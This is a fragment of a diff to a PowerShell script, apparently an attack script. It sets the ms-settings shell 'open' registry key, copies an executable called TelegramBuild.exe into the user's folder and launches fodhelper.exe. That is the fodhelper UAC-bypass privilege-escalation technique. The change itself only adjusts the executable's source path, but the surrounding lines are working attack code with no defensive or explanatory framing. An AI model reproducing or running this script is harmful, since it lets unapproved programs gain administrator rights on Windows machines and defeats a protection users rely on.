@@ -11,7 +11,7 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 Start-Sleep -Seconds 3
 
 # Copy the executable
-Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
+Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
 Start-Sleep -Seconds 4
 
 # Run fodhelper.exe
